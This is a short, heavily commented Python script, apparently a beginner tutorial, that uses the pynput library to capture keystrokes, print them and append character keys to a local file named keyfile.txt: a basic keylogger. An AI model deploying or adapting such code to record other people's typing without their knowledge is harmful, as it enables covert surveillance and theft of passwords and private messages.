# Import module
# Run this line in the console to install the pynput module to gain access to the keyboard interface:
# "py -m pip install pynput"

from pynput import keyboard

# ===============================================================

# The keyPressed method takes in the keypresses captured in the "main" method as a parameter called "key".
def keyPresed(key):

    # Printing the parameter input to the terminal.
    print(str(key))

    # Opens up a file called "keyfile.txt and the 'a' flag means to append to the file, if no file of this name exists one is automatically created.
    with open("keyfile.txt", 'a') as logKey:

        try:
            char = key.char
            logKey.write(char)
        except:
            print("ERROR: Unable to record char")

# Defines main method that launches when the script runs.
# If the "main" method is ready to fire, do the following.
if __name__ == "__main__":

    # The listener object, the "on_press" method passes the keyboard inputs to the method keyPressed via its "key" parameter.
    listener = keyboard.Listener(on_press=keyPresed)
    listener.start()
    input()
